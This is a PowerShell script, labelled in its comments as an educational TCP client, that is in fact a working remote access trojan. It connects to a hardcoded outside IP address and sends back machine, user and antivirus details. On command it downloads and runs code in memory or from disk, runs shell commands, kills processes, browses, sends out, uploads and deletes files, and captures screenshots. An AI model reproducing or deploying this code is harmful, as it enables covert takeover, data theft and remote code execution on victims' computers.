                #=================================================================
                #======================== Tcp Socket =============================
                #==================  The PowerShell-Client TCP  ==================
                #========= Development of script programming : Mr3 ===============
                #=================================================================
                #=================================================================
                #== This project was created for educational purposes only ======= 
                #=================================================================
                #=================================================================
                #== This software's main purpose is NOT to be used maliciously ===
                #=================================================================
                #== I am not responsible For any actions caused by this software =
                #=================================================================




#================The beginning of the script======================================
 
#var
$spl = "<>"
$vn = "Tech"
$sp= "&&&"

$hostname = "178.20.40.235" # Enter the IP or hostname
$port = "2121" # Enter the port

$Path = $env:temp + "\"

#Get name of current script
$ScriptName = $MyInvocation.MyCommand.Name
$fullPathIncFileName = $MyInvocation.MyCommand.Definition
#========================="*-]NK[-*"====================================
# object com
$WshShell = New-Object -comObject WScript.Shell
$Sh = New-Object -comObject Shell.Application
$Fs = New-Object -comObject Scripting.FileSystemObject

#=====================Create Soket Connect========================================
    try
    {
    #Namespace ==>System.Net.Sockets 
    #Provides client connections for TCP network services.
    <#
    ' Create a TcpClient.
          ' Note, for this client to work you need to have a TcpServer 
          ' connected to the same address as specified by the server, port
          ' combination.
     #>
    $Client = New-Object -TypeName System.Net.Sockets.TcpClient
    $Client.Connect($hostname, $port)
    # Uses the GetStream public method to return the NetworkStream.
    # Get a client stream for reading and writing.
    $tcpStream = $Client.GetStream()
    }
    catch
    {
        
        $_.Exception.Message
    }
#==================================================================
# Function get information
function info { 

    $mch = [environment]::Machinename
    $usr = [environment]::username
    $SerialNumber = $Fs.GetDrive("c:\").SerialNumber
    $SerialNumber = "{0:X}" -f $SerialNumber
    $HWD = $SerialNumber
    
    $wi = (Get-WmiObject Win32_OperatingSystem).Caption
    $wi = $wi + (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    $wi =$wi.replace('64-bit',' x64').replace('32-bit',' x86').replace('?','e');
    $av = (Get-WmiObject -Namespace 'root/SecurityCenter2' -Class 'AntiVirusProduct').displayname;
    $nanav =""
    if ($av -eq $null) 
    {$av = 'nan-av'}
    $e = $env:windir + '\Microsoft.NET\Framework\v2.0.50727\vbc.exe';
    if (test-path $e) 
    {$nt = '.Net YES'} 
    else 
    {$nt= '.Net NO'};
     if (test-path 'HKCU:\vdw0rm')
     {$usb = 'TRUE'} else { $usb = 'FALSE'};
    $u = 'PC' + $spl + $vn + '-' + $HWD+ $spl + $usr + $spl + $mch + $spl + $wi + $spl + $av + $spl + $nt + $spl + $usb + $spl + $sp;
     return $u
     
 }

#============================ functions controler =================================
Function getdriver{
     $fso = New-Object -Com "Scripting.FileSystemObject"
        foreach ($driv in $fso.drives ){
         if ($driv.isready -eq  $true  ){
            $drv = $drv + $driv.path + "|" 
         }
        
         }
    return $drv
}
#=============================================================
Function getfolder($dir) {
[System.IO.DirectoryInfo]$directInf = New-Object IO.DirectoryInfo($dir )
$frd = $dir + '<|>'
$folders = $directInf.GetDirectories()
 foreach($fd in $directInf.GetDirectories()){
 $frd += $fd.Name + "|" + "" + "|" + "Folder" + "|" + '<|>'
 
 }

$dInf = New-Object IO.DirectoryInfo($dir)

$fileEntries =[IO.FileInfo]
foreach( $fileEntries in $dInf.GetFiles("*.*")) 
{

 $frd += $fileEntries.Name + "|" + $fileEntries.Length + "|" + "File" + "|" + '<|>'

}
return $frd
} 
#=========================================================================================
Function process-m{ 
$ProcRunning =Get-Process
 foreach ($process in $ProcRunning)
    {
    
    $pd += $process.ProcessName+ "|" + $process.id + "|" + $process.path + '<|>'
    
 }  
    return $pd
}

#===================CMDOS========================================================================

function CMDOS($cmd){
    $WshShell.run("cmd /c " + $cmd + " > " + $Path + "outs.txt & exit",0)
    Start-Sleep -s 1
    $text = [IO.File]::ReadAllText($env:temp + "\outs.txt",[System.Text.Encoding]::Default) 
    Remove-Item $env:temp + "\outs.txt"
    return $text
}

#======================= Main script============================================================
#=====================  The main episode of the script    ======================================
while($true) {

        

 if ($Client.Connected){
         if ($tcpStream.CanRead -And $Client.Available -ge 0 ){
                    
                 #Set the receive buffer size to 16k  16384
                 $buffer = New-Object -TypeName System.Byte[] $Client.ReceiveBufferSize
                 # Get a client stream for reading
                 $read = $tcpStream.Read($buffer, 0, $Client.ReceiveBufferSize)
                 # Translate and store message
                 $PP += [System.Text.Encoding]::Default.GetString($buffer, 0,$read)
                    
                 # [System.Threading.Thread]::Sleep(10) 
                    
                  #=== To make sure the package is finished =====
                   If ($PP.Contains($sp)){
                    
                          $T = $PP.split($spl)
                     
                          $PP =$null
                   }
                   
                   #==============================================
         
                  # send info data
                 if ($T[0] -eq 'pc') {
                     
                         $message = info
                       
                         $data = [System.Text.Encoding]::Default.GetBytes($message)
                         $tcpStream.Write($data, 0, $data.Length)
                         $message = $null 
                  }
                 # close client 
                 if ($T[0] -eq 'cl') {
                 
                        exit
                  
                  }
                  
                 # reconnect client
                 if ($T[0] -eq 'dis') {
                   
                         $tcpStream.Dispose()
                         $Client.Close()
                        
                  } 
                  
                   # Load to memory                
                 if ($T[0] -eq 'Mem') {
				 
    				[AppDomain]::CurrentDomain.Load([Convert]::Frombase64String((New-Object System.Net.WebClient).Downloadstring($T[2]))).EntryPoint.invoke($null,$null)

                 } 
                 # downlader 
                 if ($T[0] -eq 'Dow') {
                   
                         $wc = New-Object System.Net.WebClient
                         $wc.DownloadFile($T[2], $Path + $T[4] )
                         [System.Diagnostics.Process]::Start($Path + $T[4]) 

                 }
                 # open process manager & send data
                 if ($T[0] -eq 'opr'){
                
                         $proc = process-m
                       
                         $data = [System.Text.Encoding]::ASCII.GetBytes('opr'+ $spl + $proc + $sp)
                         $tcpStream.Write($data, 0, $data.Length)
                         $proc = $null
                    
                  }
                  #send data process manager
                  if ($T[0] -eq 'prc'){
                
                         $proc = process-m
                       
                         $data = [System.Text.Encoding]::ASCII.GetBytes('process'+ $spl + $proc + $sp)
                         $tcpStream.Write($data, 0, $data.Length)
                         $proc = $null
                    
                  }
                  # stop or kill process 
                  if ($T[0] -eq 'kpr') {
                  
       
                        stop-process -id $T[2]
                   
                  }
                  # open cmd
                  if ($T[0] -eq 'cmd'){
                
                  
                        $data = [System.Text.Encoding]::ASCII.GetBytes('cmd'+ $spl + $sp)
                        $tcpStream.Write($data, 0, $data.Length)
                    
                  }
                  # send data cmd
                  if ($T[0] -eq 'sh'){

                         $text = CMDOS($T[2])
                         $data = [System.Text.Encoding]::ASCII.GetBytes('sh'+ $spl + $text + $sp)
                         $tcpStream.Write($data, 0, $data.Length)
                         $text = $null
                  }
                   # open file manager               
                  if ($T[0] -eq 'frm') {
                         $data = [System.Text.Encoding]::ASCII.GetBytes('frm'+ $spl + $sp)
                         $tcpStream.Write($data, 0, $data.Length)
       
                  }
                  # get driver & send data file manager
                  if ($T[0] -eq 'drv') {
                         $drv = getdriver($T[2])
                        
                         $data = [System.Text.Encoding]::ASCII.GetBytes('drv' + $spl + $drv + $spl + $sp)
                         $tcpStream.Write($data, 0, $data.Length)
                        
                         $drv=$null 
                   
                  }
                  # get folder & send data file manager
                  if ($T[0] -eq 'fld') {
                          $fld = getfolder($T[2])
                       
                         $data = [System.Text.Encoding]::ASCII.GetBytes('fld'+ $spl + $fld + $spl + $sp)
                         $tcpStream.Write($data, 0, $data.Length) 
                         $fld = $null
                  }
                  
                  # download file & send data file manager
                  if ($T[0] -eq 'dwn') {
                     
                         $content =[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($T[2]))
                         $data = [System.Text.Encoding]::ASCII.GetBytes('dwn'+ $spl + $content + $spl + $sp)
                         $tcpStream.Write($data, 0, $data.Length)
       
                  }
                  
                  # Run a file /// file manager
                  if ($T[0] -eq 'run') {
                  
                    [Diagnostics.Process]::Start($T[2])
                    
          
                  }
                  
                  # upload a file /// file manager + send data
                  if ($T[0] -eq 'up') {
                      
                        [System.IO.File]::WriteAllBytes($T[2], [Convert]::Frombase64String($T[4]))
                        $data = [System.Text.Encoding]::ASCII.GetBytes('uF1'+ $spl + $sp)
                        $tcpStream.Write($data, 0, $data.Length)
                        $T = $null
                  }
                  # send open screenshot
                  if ($T[0] -eq 'ocp') {
                  
                        $data = [System.Text.Encoding]::ASCII.GetBytes('ocp'+ $spl + $sp)
                        $tcpStream.Write($data, 0, $data.Length)
                  
                  }
                  
                  #  capture screenshot + send data
                  if ($T[0] -eq 'cap') {
                      # [System.Reflection.Assembly]::Load($T[2])
                      
                        Add-Type -AssemblyName System.Windows.Forms
                        Add-type -AssemblyName System.Drawing
                        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
                        $Width = $Screen.Width
                        $Height = $Screen.Height
                        $Left = $Screen.Left
                        $Top = $Screen.Top
                        # Create bitmap using the top-left and bottom-right bounds
                        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
                        # Create Graphics object
                        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
                        # Capture screen
                        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
                        
                        # Save to file
                        $bitmap.Save($Path + "g_h3n.tmp")
                        $jpg =[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($Path + "g_h3n.tmp"))
                        $data = [System.Text.Encoding]::ASCII.GetBytes('cap'+ $spl + $jpg + $spl + $sp)
                        $tcpStream.Write($data, 0, $data.Length)
                        
                        Remove-Item $Path + "g_h3n.tmp"
                       
                  }
                  
                  # uninstall Client
                  if ($T[0] -eq 'uns') {
                  
                    # $tcpStream.Dispose()
                    #regist.......... //EXMP///   Remove-ItemProperty -Path "HKCU:\Software\Application" -Name "test"
                    # $Client.Close()
                    #Remove-Item $Path + "test.ps1"
                   exit
                  
                  }
                  
                  # open frm to upload a file /// from disk + send data
                  if ($T[0] -eq 'u1') {
                      $data = [System.Text.Encoding]::ASCII.GetBytes('u1'+ $spl + $sp)
                      $tcpStream.Write($data, 0, $data.Length)
                  
                  }
                  # upload a file + send data
                  if ($T[0] -eq 'up1') {
                 
                      [System.IO.File]::WriteAllBytes($Path + $T[2], [Convert]::Frombase64String($T[4]))
                      [System.Diagnostics.Process]::Start($Path + $T[2]) 
                      $data = [System.Text.Encoding]::ASCII.GetBytes('uF1'+ $spl + $sp)
                      $tcpStream.Write($data, 0, $data.Length)
                  
                  }
                  # 
                  if ($T[0] -eq 'img') {
                  
                     $content =[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($T[2]))
                     $data = [System.Text.Encoding]::ASCII.GetBytes('img'+ $spl + $content + $spl + $sp)
                     $tcpStream.Write($data, 0, $data.Length)
                     $content=$null
                  }
                  
                  # Rename file ///Rename folder  Rename-Item D:\temp\Test D:\temp\Test1 /// Move folder Move-Item D:\temp\Test D:\temp\Test1
                  if ($T[0] -eq 'rnf') {
                  
                     Rename-Item $T[2] $T[4]
                  }
                  
                  # Remove file ///Remove floder Remove-Item 'D:\temp\Test Folder1'
                  if ($T[0] -eq 'df') {
                  
                     Remove-Item $T[2]
                  }
                  
                  #........... 
                  if ($T[0] -eq 'cvs') {
                     $data = [System.Text.Encoding]::ASCII.GetBytes('cvs'+ $spl + $sp)
                     $tcpStream.Write($data, 0, $data.Length)
                     
                     
                  }
                   
                 # Load byte array to memory 
                  if ($T[0] -eq 'rm') {
                  #[System.Threading.Thread]::GetDomain().Load([System.Convert]::FromBase64String($T[2]).EntryPoint.Invoke(0, 0)
                  
                  }
      
         }else {
        $tcpStream.Dispose()
        $Client.Close()
        $Client = New-Object System.Net.Sockets.TcpClient($hostname,$port)
        $tcpStream = $Client.GetStream()
       $PP =$null
        $T = $null
         }
 
 
  }else {
    $tcpStream.Dispose()
    $Client.Close()
    $Client = New-Object System.Net.Sockets.TcpClient($hostname,$port)
    $tcpStream = $Client.GetStream()
   $PP =$null
    $T = $null
 }


Start-Sleep -m 5

 }

# End of script


